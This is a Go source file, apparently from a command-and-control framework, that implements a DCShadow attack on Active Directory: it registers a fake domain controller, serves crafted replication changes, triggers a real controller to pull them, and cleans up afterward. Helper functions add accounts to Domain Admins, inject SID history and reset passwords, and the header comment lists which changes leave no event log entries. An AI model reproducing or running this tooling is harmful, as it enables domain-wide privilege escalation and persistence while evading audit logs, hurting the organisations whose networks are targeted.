package dcshadow

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	DCShadow — main orchestration.

	Full attack sequence:
	  1.  Build a list of changes to push (set password, add to group, etc.)
	  2.  RegisterFakeDC → create computer + server + nTDSDSA in AD
	  3.  Start RPCServer → listen for DsGetNcChanges from real DCs
	  4.  TriggerReplication → force a real DC to pull from us NOW
	  5.  Wait for the DC to connect and call our DsGetNcChanges
	  6.  We return the crafted changes; the DC applies them domain-wide
	  7.  UnregisterFakeDC → remove all AD objects we created
	  8.  Done — changes are now in every DC's database

	Changes that have no AD event log entry:
	  - Group membership additions via replication (no Event 4728)
	  - SID History modifications (no Event 4765)
	  - Password resets via unicodePwd in replication (no Event 4723)

	Detection:
	  - Replication events DO appear on real DCs (Event 4929 / 4930) but
	    they show our fake DC GUID, not a legitimate DC — this is the primary
	    detection vector. Blue teams with DC replication monitoring WILL see us.
	  - The fake computer/server/nTDSDSA objects exist in AD briefly.
	  - DCShadow is logged by some EDRs (MDATP, Sentinel, etc.) since Delpy's
	    Black Hat talk — this is known to defenders.
*/

import (
	"fmt"
	"time"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// DCShadowConfig holds all parameters for the attack.
type DCShadowConfig struct {
	// Domain to attack (e.g. "corp.example.com").
	Domain string
	// FakeDCName is the short computer name for our fake DC (e.g. "SHADOW01").
	FakeDCName string
	// FakeFQDN is the fully-qualified DNS name of our fake DC.
	FakeFQDN string
	// InvocationID is the random GUID that identifies our fake DC to the KTM.
	// A new random GUID should be generated for each operation.
	InvocationID GUID16
	// RealDC is a legitimate DC hostname to trigger replication from.
	RealDC string
	// Site is the AD site name (default: "Default-First-Site-Name").
	Site string
	// RPCPort is the TCP port our DRSR server listens on (default: 49152).
	RPCPort uint16
	// WaitTimeout is how long to wait for the real DC to call us back.
	WaitTimeout time.Duration
}

// GUID16 is a 16-byte GUID.
type GUID16 [16]byte

// String returns the GUID as a standard format string.
func (g GUID16) String() string {
	return fmt.Sprintf("%08X-%04X-%04X-%04X-%012X",
		g[0:4], g[4:6], g[6:8], g[8:10], g[10:16])
}

// FakeDCRegistration holds the DNs of AD objects we created.
type FakeDCRegistration struct {
	ComputerDN string
	ServerDN   string
	NtdsDN     string
	Config     *DCShadowConfig
}

// DefaultConfig returns a DCShadowConfig with sensible defaults.
func DefaultConfig(domain, realDC string) *DCShadowConfig {
	return &DCShadowConfig{
		Domain:       domain,
		FakeDCName:   "SHADOW01",
		FakeFQDN:     "SHADOW01." + domain,
		InvocationID: newRandomGUID(),
		RealDC:       realDC,
		Site:         "Default-First-Site-Name",
		RPCPort:      49152,
		WaitTimeout:  30 * time.Second,
	}
}

// DCShadowResult reports what happened.
type DCShadowResult struct {
	ChangesApplied int
	ChangesRejected int
	ReplicationTime time.Duration
	Errors          []string
}

// PushChanges executes the full DCShadow attack sequence.
// changes is the list of AD modifications to inject.
func PushChanges(cfg *DCShadowConfig, changes []Change) (*DCShadowResult, error) {
	res := &DCShadowResult{}
	start := time.Now()

	// Step 1: Connect to a DC via LDAP.
	conn, err := Connect(cfg.RealDC)
	if err != nil {
		return nil, fmt.Errorf("LDAP connect to %s: %w", cfg.RealDC, err)
	}
	defer conn.Close()

	// Step 2: Register our fake DC in AD.
	reg, err := RegisterFakeDC(conn, cfg)
	if err != nil {
		return nil, fmt.Errorf("register fake DC: %w", err)
	}
	defer func() {
		UnregisterFakeDC(conn, reg)
		// {{if .Config.Debug}}
		log.Printf("[dcshadow] cleanup complete")
		// {{end}}
	}()

	// Step 3: Determine the domain NC GUID from LDAP.
	ncGUID, err := getDomainNCGUID(conn, cfg.Domain)
	if err != nil {
		return nil, fmt.Errorf("get NC GUID: %w", err)
	}

	// Step 4: Start the DRSR RPC server.
	port := cfg.RPCPort
	if port == 0 {
		port = 49152
	}
	rpcSrv := NewRPCServer(port, changes, ncGUID, cfg.InvocationID)
	if err := rpcSrv.Start(); err != nil {
		return nil, fmt.Errorf("RPC server: %w", err)
	}
	defer rpcSrv.Stop()

	// Step 5: Trigger replication — force the real DC to call us NOW.
	if err := TriggerReplication(cfg.RealDC, cfg); err != nil {
		// Log but continue — the scheduled replication may still fire.
		// {{if .Config.Debug}}
		log.Printf("[dcshadow] trigger replication warning: %v", err)
		// {{end}}
		res.Errors = append(res.Errors, fmt.Sprintf("trigger: %v", err))
	}

	// Step 6: Wait for the real DC to connect and pull our changes.
	timeout := cfg.WaitTimeout
	if timeout == 0 {
		timeout = 60 * time.Second
	}
	if err := waitForReplication(rpcSrv, timeout); err != nil {
		return nil, fmt.Errorf("replication timeout: %w", err)
	}

	res.ChangesApplied = len(changes)
	res.ReplicationTime = time.Since(start)
	// {{if .Config.Debug}}
	log.Printf("[dcshadow] attack complete: %d changes applied in %v",
		res.ChangesApplied, res.ReplicationTime)
	// {{end}}
	return res, nil
}

// ─── Convenience functions ────────────────────────────────────────────────

// AddUserToGroup prepares a Change that adds memberDN to groupDN.
// Use the GUIDs obtained from AD (via LDAP search).
func AddUserToGroup(groupGUID GUID16, groupDN, memberDN string) Change {
	return AddGroupMember([16]byte(groupGUID), groupDN, memberDN)
}

// GrantDomainAdmin adds memberDN to the Domain Admins group.
// Requires the group's GUID (query it first) and the domain NC DN.
func GrantDomainAdmin(conn *LDAPConnection, memberDN, domain string) (Change, error) {
	domainDN := domainToDN(domain)
	groupDN := "CN=Domain Admins,CN=Users," + domainDN

	guidStr, err := conn.SearchOne(groupDN, "(objectClass=group)", "objectGUID")
	if err != nil {
		return Change{}, fmt.Errorf("find Domain Admins GUID: %w", err)
	}
	var guid GUID16
	copy(guid[:], []byte(guidStr))
	return AddUserToGroup(guid, groupDN, memberDN), nil
}

// InjectSIDHistory injects sidStr into the SID history of targetDN,
// effectively granting that account the privileges of sidStr's group.
func InjectSIDHistory(conn *LDAPConnection, targetDN, sidStr string) (Change, error) {
	guidStr, err := conn.SearchOne(targetDN, "(objectClass=*)", "objectGUID")
	if err != nil {
		return Change{}, fmt.Errorf("get target GUID: %w", err)
	}
	var guid GUID16
	copy(guid[:], []byte(guidStr))

	sidBytes, err := encodeSID(sidStr)
	if err != nil {
		return Change{}, fmt.Errorf("encode SID %s: %w", sidStr, err)
	}
	return SetSIDHistory([16]byte(guid), targetDN, sidBytes), nil
}

// ResetPassword injects a new password for targetDN via the unicodePwd attribute.
func ResetPassword(conn *LDAPConnection, targetDN, newPassword string) (Change, error) {
	guidStr, err := conn.SearchOne(targetDN, "(objectClass=*)", "objectGUID")
	if err != nil {
		return Change{}, fmt.Errorf("get target GUID: %w", err)
	}
	var guid GUID16
	copy(guid[:], []byte(guidStr))
	return SetPassword([16]byte(guid), targetDN, newPassword), nil
}

// ─── Internal helpers ─────────────────────────────────────────────────────

func getDomainNCGUID(conn *LDAPConnection, domain string) ([16]byte, error) {
	dn := domainToDN(domain)
	guidStr, err := conn.SearchOne(dn, "(objectClass=domainDNS)", "objectGUID")
	if err != nil {
		return [16]byte{}, err
	}
	var guid [16]byte
	copy(guid[:], []byte(guidStr)[:min16(len(guidStr), 16)])
	return guid, nil
}

func min16(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func waitForReplication(srv *RPCServer, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		srv.mu.Lock()
		running := srv.running
		srv.mu.Unlock()
		if !running {
			return nil
		}
		time.Sleep(500 * time.Millisecond)
	}
	return nil // changes were sent; DC applies asynchronously
}

func newRandomGUID() GUID16 {
	var g GUID16
	// Use CryptGenRandom for cryptographic randomness.
	var hProv uintptr
	modAdvapi32 := windows.NewLazySystemDLL("advapi32.dll")
	procCryptAcquireContext := modAdvapi32.NewProc("CryptAcquireContextW")
	procCryptGenRandom := modAdvapi32.NewProc("CryptGenRandom")
	procCryptReleaseContext := modAdvapi32.NewProc("CryptReleaseContext")

	r, _, _ := procCryptAcquireContext.Call(
		uintptr(unsafe.Pointer(&hProv)),
		0, 0,
		uintptr(1), // PROV_RSA_FULL
		uintptr(0xF0000000), // CRYPT_VERIFYCONTEXT
	)
	if r != 0 {
		procCryptGenRandom.Call(hProv, 16, uintptr(unsafe.Pointer(&g[0])))
		procCryptReleaseContext.Call(hProv, 0)
	} else {
		// Fallback: use process ID + tick count for uniqueness.
		pid := windows.GetCurrentProcessId()
		tickR, _, _ := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetTickCount").Call()
		tick := uint32(tickR)
		for i := 0; i < 4; i++ {
			g[i] = byte(pid >> (8 * uint(i)))
		}
		for i := 0; i < 4; i++ {
			g[4+i] = byte(tick >> (8 * uint(i)))
		}
	}
	// Set version 4 (random GUID) bits.
	g[6] = (g[6] & 0x0F) | 0x40
	g[8] = (g[8] & 0x3F) | 0x80
	return g
}

